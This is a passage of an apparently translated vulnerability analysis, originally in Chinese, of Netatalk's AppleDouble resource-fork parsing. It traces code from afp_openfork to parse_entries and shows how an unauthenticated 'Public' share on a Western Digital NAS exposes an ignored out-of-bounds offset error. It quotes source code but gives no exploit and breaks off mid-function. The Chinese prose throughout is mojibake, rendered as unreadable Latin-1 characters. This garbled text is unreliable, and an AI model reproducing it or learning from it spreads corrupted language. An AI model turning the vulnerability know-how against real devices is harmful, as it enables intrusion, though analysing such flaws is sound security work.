</pre></table></code></div></div><p>è¿™é‡Œæœ‰ä¸€ä¸ªæœ‰è¶£çš„äº‹æƒ…å€¼å¾—æ³¨æ„ï¼šè¥¿éƒ¨æ•°æ®PR4100è®¾å¤‡åœ¨é»˜è®¤ç¯å¢ƒä¸‹å¼€æ”¾äº†ä¸€ä¸ª<code class="language-plaintext highlighter-rouge">Public</code>çš„AFPå…±äº«ï¼Œå…è®¸å®¢æˆ·ç«¯ä¸ç»ä»»ä½•è®¤è¯å³å¯è®¿é—®ã€‚è¿™æ„å‘³ç€åªè¦æˆ‘ä»¬è®¿é—®çš„ç›®æ ‡æ˜¯è¿™ä¸ª<code class="language-plaintext highlighter-rouge">Public</code> AFPå…±äº«ï¼Œå°±å¯ä»¥è®¿é—®æ‰€æœ‰è®¤è¯åçš„å‡½æ•°å¥æŸ„ã€‚å¦å¤–åŒæ ·å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç›¸åŒçš„<code class="language-plaintext highlighter-rouge">Public</code>å…±äº«ç›®å½•ä¹Ÿå¯ä»¥ä½¿ç”¨guestç”¨æˆ·é€šè¿‡SMBåè®®æ¥è®¿é—®ï¼Œè€Œä¸éœ€è¦è¾“å…¥ä»»ä½•å¯†ç ã€‚è¿™è¯´æ˜æˆ‘ä»¬å¯ä»¥é€šè¿‡AFPæˆ–è€…SMBåè®®è¯»å–ã€åˆ›å»ºæˆ–ä¿®æ”¹å­˜å‚¨äºè¿™ä¸ª<code class="language-plaintext highlighter-rouge">Public</code>å…±äº«ç›®å½•ä¸­ä»»æ„æ–‡ä»¶ã€‚</p><p>æˆ‘ä»¬æ„Ÿå…´è¶£çš„AFPå‘½ä»¤æ˜¯â€œFPOpenForkâ€ï¼Œè¯¥å‘½ä»¤è¢«<code class="language-plaintext highlighter-rouge">afp_openfork()</code>å‡½æ•°å¥æŸ„æ¥å¤„ç†ã€‚å¦‚ä¸Šæ–‡æ‰€è¿°ï¼Œforkæ–‡ä»¶æ˜¯ç”¨æ¥å­˜å‚¨ä¸€ä¸ªå¸¸è§„æ–‡ä»¶çš„å±æ€§ç­‰å…ƒæ•°æ®çš„ç‰¹æ®Šæ–‡ä»¶ã€‚forkæ–‡ä»¶æ˜¯ä»¥AppleDoubleæ–‡ä»¶æ ¼å¼å­˜å‚¨çš„ã€‚<code class="language-plaintext highlighter-rouge">afp_openfork()</code>å‡½æ•°å¥æŸ„ä¼šåœ¨ç£ç›˜ä¸ŠæŸ¥æ‰¾forkæ–‡ä»¶çš„è·¯å¾„å¹¶æ‰“å¼€ï¼Œä¹‹åè°ƒç”¨<code class="language-plaintext highlighter-rouge">ad_open()</code>å‡½æ•°æ¥å¤„ç†ï¼ˆâ€œadâ€ä»£è¡¨AppleDoubleï¼‰ã€‚</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/etc/afpd/fork.c</span>
<span class="cm">/* ----------------------- */</span>
<span class="kt">int</span> <span class="nf">afp_openfork</span><span class="p">(</span><span class="n">AFPObj</span> <span class="o">*</span><span class="n">obj</span> <span class="n">_U_</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ibuf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">ibuflen</span> <span class="n">_U_</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">rbuf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="o">*</span><span class="n">rbuflen</span><span class="p">)</span>
<span class="p">{</span>
    <span class="p">...</span>
    <span class="k">struct</span> <span class="nc">adouble</span>  <span class="o">*</span><span class="n">adsame</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">...</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">opened</span> <span class="o">=</span> <span class="n">of_findname</span><span class="p">(</span><span class="n">vol</span><span class="p">,</span> <span class="n">s_path</span><span class="p">)))</span> <span class="p">{</span>
        <span class="n">adsame</span> <span class="o">=</span> <span class="n">opened</span><span class="o">-&gt;</span><span class="n">of_ad</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">...</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">ofork</span> <span class="o">=</span> <span class="n">of_alloc</span><span class="p">(</span><span class="n">vol</span><span class="p">,</span> <span class="n">curdir</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ofrefnum</span><span class="p">,</span> <span class="n">eid</span><span class="p">,</span> <span class="n">adsame</span><span class="p">,</span> <span class="n">st</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">AFPERR_NFILE</span><span class="p">;</span>
    <span class="p">...</span>
    <span class="cm">/* First ad_open(), opens data or ressource fork */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ad_open</span><span class="p">(</span><span class="n">ofork</span><span class="o">-&gt;</span><span class="n">of_ad</span><span class="p">,</span> <span class="n">upath</span><span class="p">,</span> <span class="n">adflags</span><span class="p">,</span> <span class="mo">0666</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">ad_open()</code>å‡½æ•°éå¸¸æ™®é€šï¼Œå®ƒèƒ½å¤Ÿæ‰“å¼€ä¸åŒçš„forkæ–‡ä»¶ï¼šä¸€ä¸ªæ•°æ®ï¼ˆdataï¼‰forkæ–‡ä»¶ï¼Œä¸€ä¸ªå…ƒæ•°æ®ï¼ˆmetadataï¼‰forkæ–‡ä»¶æˆ–è€…ä¸€ä¸ªèµ„æºï¼ˆresourceï¼‰forkæ–‡ä»¶ã€‚ç”±äºæˆ‘ä»¬å¤„ç†çš„æ˜¯ä¸€ä¸ªèµ„æºforkæ–‡ä»¶ï¼ˆè¯‘è€…ï¼šåœ¨åˆ©ç”¨æ—¶ï¼‰ï¼Œæˆ‘ä»¬æœ€ç»ˆä¼šè°ƒç”¨<code class="language-plaintext highlighter-rouge">ad_open_rf()</code>å‡½æ•°ï¼ˆâ€œrfâ€ä»£è¡¨resource forkï¼‰ã€‚</p><p>æ³¨æ„ï¼š<code class="language-plaintext highlighter-rouge">ad_open()</code>ä½äº<code class="language-plaintext highlighter-rouge">libatalk/</code>ç›®å½•å½“ä¸­ï¼Œè€Œä¸æ˜¯ä¹‹å‰è®¨è®ºçš„ä»£ç æ‰€åœ¨çš„<code class="language-plaintext highlighter-rouge">etc/afpd</code>ç›®å½•ã€‚å› æ­¤ï¼Œä»ç°åœ¨èµ·ï¼Œæˆ‘ä»¬åˆ†æçš„ä»£ç éƒ½ä½äº<code class="language-plaintext highlighter-rouge">libatalk.so</code>åº“ä¸­ã€‚</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/libatalk/adouble/ad_open.c</span>
<span class="cm">/*!
 * Open data-, metadata(header)- or ressource fork
 *
 * ad_open(struct adouble *ad, const char *path, int adflags, int flags)
 * ad_open(struct adouble *ad, const char *path, int adflags, int flags, mode_t mode)
 *
 * You must call ad_init() before ad_open, usually you'll just call it like this: \n
 * @code
 *      struct adoube ad;
 *      ad_init(&amp;ad, vol-&gt;v_adouble, vol-&gt;v_ad_options);
 * @endcode
 *
 * Open a files data fork, metadata fork or ressource fork.
 *
 * @param ad        (rw) pointer to struct adouble
 * @param path      (r)  Path to file or directory
 * @param adflags   (r)  Flags specifying which fork to open, can be or'd:
 *                         ADFLAGS_DF:        open data fork
 *                         ADFLAGS_RF:        open ressource fork
 *                         ADFLAGS_HF:        open header (metadata) file
 *                         ADFLAGS_NOHF:      it's not an error if header file couldn't be opened
 *                         ADFLAGS_NORF:      it's not an error if reso fork couldn't be opened
 *                         ADFLAGS_DIR:       if path is a directory you MUST or ADFLAGS_DIR to adflags
 *
 *                       Access mode for the forks:
 *                         ADFLAGS_RDONLY:    open read only
 *                         ADFLAGS_RDWR:      open read write
 *
 *                       Creation flags:
 *                         ADFLAGS_CREATE:    create if not existing
 *                         ADFLAGS_TRUNC:     truncate
 *
 *                       Special flags:
 *                         ADFLAGS_CHECK_OF:  check for open forks from us and other afpd's
 *                         ADFLAGS_SETSHRMD:  this adouble struct will be used to set sharemode locks.
 *                                            This basically results in the files being opened RW instead of RDONLY.
 * @param mode      (r)  mode used with O_CREATE
 *
 * The open mode flags (rw vs ro) have to take into account all the following requirements:
 * - we remember open fds for files because me must avoid a single close releasing fcntl locks for other
 *   fds of the same file
 *
 * BUGS:
 *
 * * on Solaris (HAVE_EAFD) ADFLAGS_RF doesn't work without
 *   ADFLAGS_HF, because it checks whether ad_meta_fileno() is already
 *   openend. As a workaround pass ADFLAGS_SETSHRMD.
 *
 * @returns 0 on success, any other value indicates an error
 */</span>
<span class="kt">int</span> <span class="nf">ad_open</span><span class="p">(</span><span class="k">struct</span> <span class="nc">adouble</span> <span class="o">*</span><span class="n">ad</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="kt">int</span> <span class="n">adflags</span><span class="p">,</span> <span class="p">...)</span>
<span class="p">{</span>
    <span class="p">...</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">adflags</span> <span class="o">&amp;</span> <span class="n">ADFLAGS_RF</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ad_open_rf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">adflags</span><span class="p">,</span> <span class="n">mode</span><span class="p">,</span> <span class="n">ad</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">EC_FAIL</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">ad_open_rf()</code>å‡½æ•°ä¹‹åä¼šè°ƒç”¨å¹¶è¿›å…¥<code class="language-plaintext highlighter-rouge">ad_open_rf_ea()</code>å‡½æ•°ï¼š</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/libatalk/adouble/ad_open.c</span>
<span class="cm">/*!
 * Open ressource fork
 */</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">ad_open_rf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="kt">int</span> <span class="n">adflags</span><span class="p">,</span> <span class="kt">int</span> <span class="n">mode</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">adouble</span> <span class="o">*</span><span class="n">ad</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_vers</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">case</span> <span class="n">AD_VERSION2</span><span class="p">:</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">ad_open_rf_v2</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">adflags</span><span class="p">,</span> <span class="n">mode</span><span class="p">,</span> <span class="n">ad</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">AD_VERSION_EA</span><span class="p">:</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">ad_open_rf_ea</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">adflags</span><span class="p">,</span> <span class="n">mode</span><span class="p">,</span> <span class="n">ad</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="nl">default:</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">ad_open_rf_ea()</code>å‡½æ•°æ‰“å¼€ï¼ˆè¯‘è€…ï¼šæˆ‘ä»¬æ‰€æŒ‡å®šçš„ï¼‰èµ„æºforkæ–‡ä»¶ã€‚å‡å®šè¯¥æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œè¯¥å‡½æ•°æœ€ç»ˆä¼šè°ƒç”¨å¹¶è¿›å…¥<code class="language-plaintext highlighter-rouge">ad_header_read_osx()</code>å‡½æ•°ï¼Œè¯»å–è¯¥æ–‡ä»¶çš„ã€åŸºäºAppleDoubleæ ¼å¼çš„å®é™…å†…å®¹ï¼š</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="k">static</span> <span class="kt">int</span> <span class="nf">ad_open_rf_ea</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="kt">int</span> <span class="n">adflags</span><span class="p">,</span> <span class="kt">int</span> <span class="n">mode</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">adouble</span> <span class="o">*</span><span class="n">ad</span><span class="p">)</span>
<span class="p">{</span>
    <span class="p">...</span>

<span class="cp">#ifdef HAVE_EAFD
</span>    <span class="p">...</span>
<span class="cp">#else
</span>    <span class="n">EC_NULL_LOG</span><span class="p">(</span> <span class="n">rfpath</span> <span class="o">=</span> <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_ops</span><span class="o">-&gt;</span><span class="n">ad_path</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">adflags</span><span class="p">)</span> <span class="p">);</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">ad_reso_fileno</span><span class="p">(</span><span class="n">ad</span><span class="p">)</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">rfpath</span><span class="p">,</span> <span class="n">oflags</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">...</span>
    <span class="p">}</span>
<span class="cp">#endif
</span>    <span class="n">opened</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_rfp</span><span class="o">-&gt;</span><span class="n">adf_refcount</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_rfp</span><span class="o">-&gt;</span><span class="n">adf_flags</span> <span class="o">=</span> <span class="n">oflags</span><span class="p">;</span>
    <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_reso_refcount</span><span class="o">++</span><span class="p">;</span>

<span class="cp">#ifndef HAVE_EAFD
</span>    <span class="n">EC_ZERO_LOG</span><span class="p">(</span> <span class="n">fstat</span><span class="p">(</span><span class="n">ad_reso_fileno</span><span class="p">(</span><span class="n">ad</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">)</span> <span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_rfp</span><span class="o">-&gt;</span><span class="n">adf_flags</span> <span class="o">&amp;</span> <span class="n">O_CREAT</span><span class="p">)</span> <span class="p">{</span>
        <span class="cm">/* This is a new adouble header file, create it */</span>
        <span class="n">LOG</span><span class="p">(</span><span class="n">log_debug</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"ad_open_rf(</span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">): created adouble rfork, initializing: </span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">"</span><span class="p">,</span>
            <span class="n">path</span><span class="p">,</span> <span class="n">rfpath</span><span class="p">);</span>
        <span class="n">EC_NEG1_LOG</span><span class="p">(</span> <span class="n">new_ad_header</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">adflags</span><span class="p">)</span> <span class="p">);</span>
        <span class="n">LOG</span><span class="p">(</span><span class="n">log_debug</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"ad_open_rf(</span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">): created adouble rfork, flushing: </span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">"</span><span class="p">,</span>
            <span class="n">path</span><span class="p">,</span> <span class="n">rfpath</span><span class="p">);</span>
        <span class="n">ad_flush</span><span class="p">(</span><span class="n">ad</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="cm">/* Read the adouble header */</span>
        <span class="n">LOG</span><span class="p">(</span><span class="n">log_debug</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"ad_open_rf(</span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">): reading adouble rfork: </span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">"</span><span class="p">,</span>
            <span class="n">path</span><span class="p">,</span> <span class="n">rfpath</span><span class="p">);</span>
        <span class="n">EC_NEG1_LOG</span><span class="p">(</span> <span class="n">ad_header_read_osx</span><span class="p">(</span><span class="n">rfpath</span><span class="p">,</span> <span class="n">ad</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">)</span> <span class="p">);</span>
    <span class="p">}</span>
<span class="cp">#endif
</span></pre></table></code></div></div><p>æˆ‘ä»¬ç»ˆäºæ¥åˆ°äº†æˆ‘ä»¬çš„æ¼æ´å‡½æ•°ï¼š<code class="language-plaintext highlighter-rouge">ad_header_read_osx()</code>ã€‚</p><h2 id="b-ç†è§£æ¼æ´">B. ç†è§£æ¼æ´</h2><p><code class="language-plaintext highlighter-rouge">ad_header_read_osx()</code>å‡½æ•°è¯»å–èµ„æºforkæ–‡ä»¶çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯å°†æ–‡ä»¶å†…å®¹æ ¹æ®AppleDoubleæ ¼å¼è¿›è¡Œç†è§£ã€‚Netatalkæ ¹æ®AppleDoubleæ ¼å¼ï¼Œå°†æ ¼å¼ä¸­çš„å„ä¸ªå…ƒç´ ä¿å­˜è¿›ç¨‹åºå®šä¹‰çš„<code class="language-plaintext highlighter-rouge">adouble</code>æ•°æ®ç»“æ„å½“ä¸­ï¼Œè¯¥ç»“æ„å°†åœ¨ä¸‹æ–‡ä¸­è¯¦è§£ã€‚<code class="language-plaintext highlighter-rouge">ad_header_read_osx()</code>å‡½æ•°å¼€å§‹è¯»å–AppleDoubleå¤´éƒ¨æ¥åˆ¤æ–­è¯¥èµ„æºforkæ–‡ä»¶æœ‰å¤šå°‘ä¸ªentryã€‚</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/libatalk/adouble/ad_open.c</span>
<span class="cm">/* Read an ._ file, only uses the resofork, finderinfo is taken from EA */</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">ad_header_read_osx</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">adouble</span> <span class="o">*</span><span class="n">ad</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="nc">stat</span> <span class="o">*</span><span class="n">hst</span><span class="p">)</span>
<span class="p">{</span>
    <span class="p">...</span>
    <span class="k">struct</span> <span class="nc">adouble</span>      <span class="n">adosx</span><span class="p">;</span>
    <span class="p">...</span>
    <span class="n">LOG</span><span class="p">(</span><span class="n">log_debug</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"ad_header_read_osx: %s"</span><span class="p">,</span> <span class="n">path</span> <span class="o">?</span> <span class="n">fullpathname</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="o">:</span> <span class="s">""</span><span class="p">);</span>
    <span class="n">ad_init_old</span><span class="p">(</span><span class="o">&amp;</span><span class="n">adosx</span><span class="p">,</span> <span class="n">AD_VERSION_EA</span><span class="p">,</span> <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_options</span><span class="p">);</span>
    <span class="n">buf</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">adosx</span><span class="p">.</span><span class="n">ad_data</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">adosx</span><span class="p">.</span><span class="n">ad_data</span><span class="p">));</span>
    <span class="n">adosx</span><span class="p">.</span><span class="n">ad_rfp</span><span class="o">-&gt;</span><span class="n">adf_fd</span> <span class="o">=</span> <span class="n">ad_reso_fileno</span><span class="p">(</span><span class="n">ad</span><span class="p">);</span>

    <span class="cm">/* read the header */</span>
    <span class="n">EC_NEG1</span><span class="p">(</span> <span class="n">header_len</span> <span class="o">=</span> <span class="n">adf_pread</span><span class="p">(</span><span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_rfp</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">AD_DATASZ_OSX</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="p">);</span>
    <span class="p">...</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">adosx</span><span class="p">.</span><span class="n">ad_magic</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">adosx</span><span class="p">.</span><span class="n">ad_magic</span><span class="p">));</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">adosx</span><span class="p">.</span><span class="n">ad_version</span><span class="p">,</span> <span class="n">buf</span> <span class="o">+</span> <span class="n">ADEDOFF_VERSION</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">adosx</span><span class="p">.</span><span class="n">ad_version</span><span class="p">));</span>
    <span class="n">adosx</span><span class="p">.</span><span class="n">ad_magic</span> <span class="o">=</span> <span class="n">ntohl</span><span class="p">(</span><span class="n">adosx</span><span class="p">.</span><span class="n">ad_magic</span><span class="p">);</span>
    <span class="n">adosx</span><span class="p">.</span><span class="n">ad_version</span> <span class="o">=</span> <span class="n">ntohl</span><span class="p">(</span><span class="n">adosx</span><span class="p">.</span><span class="n">ad_version</span><span class="p">);</span>
    <span class="p">...</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nentries</span><span class="p">,</span> <span class="n">buf</span> <span class="o">+</span> <span class="n">ADEDOFF_NENTRIES</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">nentries</span> <span class="p">));</span>
    <span class="n">nentries</span> <span class="o">=</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">nentries</span><span class="p">);</span>
    <span class="n">len</span> <span class="o">=</span> <span class="n">nentries</span> <span class="o">*</span> <span class="n">AD_ENTRY_LEN</span><span class="p">;</span>
</pre></table></code></div></div><p>ä¹‹åæˆ‘ä»¬çœ‹åˆ°ï¼Œè¯¥å‡½æ•°è¿›å…¥äº†<code class="language-plaintext highlighter-rouge">parse_entries()</code>å‡½æ•°æ¥è§£æä¸åŒçš„AppleDouble entryã€‚æœ‰æ„æ€çš„æ˜¯ï¼Œå½“<code class="language-plaintext highlighter-rouge">parse_entries()</code>å‡½æ•°å¤±è´¥æ—¶ï¼Œç¨‹åºåªæ˜¯åœ¨æ—¥å¿—ä¸­è®°å½•è¯¥é”™è¯¯ï¼Œä½†å¹¶æ²¡æœ‰é€€å‡ºï¼š</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>    <span class="n">nentries</span> <span class="o">=</span> <span class="n">len</span> <span class="o">/</span> <span class="n">AD_ENTRY_LEN</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">parse_entries</span><span class="p">(</span><span class="o">&amp;</span><span class="n">adosx</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">nentries</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">LOG</span><span class="p">(</span><span class="n">log_warning</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"ad_header_read(%s): malformed AppleDouble"</span><span class="p">,</span>
            <span class="n">path</span> <span class="o">?</span> <span class="n">fullpathname</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="o">:</span> <span class="s">""</span><span class="p">);</span>
    <span class="p">}</span>
</pre></table></code></div></div><p>å¦‚æœæˆ‘ä»¬ä»”ç»†åˆ†æ<code class="language-plaintext highlighter-rouge">parse_entries()</code>å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå½“ä»¥ä¸‹å‡ ä¸ªæ¡ä»¶ä¹‹ä¸€å‘ç”Ÿæ—¶ï¼Œå‡½æ•°è¿”å›é”™è¯¯ï¼š</p><ul><li>AppleDoubleçš„â€œeidâ€œæ˜¯0<li>AppleDoubleçš„â€œoffsetâ€è¶Šç•Œ<li>å½“â€œeidâ€ä¸æŒ‡å‘ä¸€ä¸ªèµ„æºforkæ–‡ä»¶ï¼Œä¸”AppleDoubleçš„â€œoffsetâ€åŠ ä¸Šdataçš„é•¿åº¦ä¹‹åè¶Šç•Œ</ul><p>æˆ‘ä»¬çŸ¥é“ï¼Œæˆ‘ä»¬å¤„ç†çš„æ˜¯èµ„æºforkæ–‡ä»¶ï¼Œå› æ­¤ç¬¬äºŒä¸ªæ¡ä»¶å¾ˆæœ‰è¶£ã€‚ç®€å•æ¥è¯´ï¼Œå®ƒæ„å‘³ç€æˆ‘ä»¬å¯ä»¥åœ¨forkæ–‡ä»¶ä¸­æä¾›ä¸€ä¸ªè¶Šç•Œçš„AppleDouble â€œoffsetâ€å€¼å¹¶è®©<code class="language-plaintext highlighter-rouge">parse_entries()</code>å‡½æ•°è¿”å›ä¸€ä¸ªé”™è¯¯ï¼Œä½†æ˜¯<code class="language-plaintext highlighter-rouge">ad_header_read_osx()</code>å‡½æ•°å¿½ç•¥äº†è¿™ä¸ªé”™è¯¯ï¼Œç¨‹åºç»§ç»­å¾€ä¸‹æ‰§è¡Œã€‚</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/libatalk/adouble/ad_open.c</span>
<span class="cm">/**
 * Read an AppleDouble buffer, returns 0 on success, -1 if an entry was malformatted
 **/</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">parse_entries</span><span class="p">(</span><span class="k">struct</span> <span class="nc">adouble</span> <span class="o">*</span><span class="n">ad</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">uint16_t</span> <span class="n">nentries</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint32_t</span>   <span class="n">eid</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">off</span><span class="p">;</span>
    <span class="kt">int</span>        <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="cm">/* now, read in the entry bits */</span>
    <span class="k">for</span> <span class="p">(;</span> <span class="n">nentries</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="n">nentries</span><span class="o">--</span> <span class="p">)</span> <span class="p">{</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">eid</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">eid</span> <span class="p">));</span>
        <span class="n">eid</span> <span class="o">=</span> <span class="n">get_eid</span><span class="p">(</span><span class="n">ntohl</span><span class="p">(</span><span class="n">eid</span><span class="p">));</span>
        <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">eid</span> <span class="p">);</span>
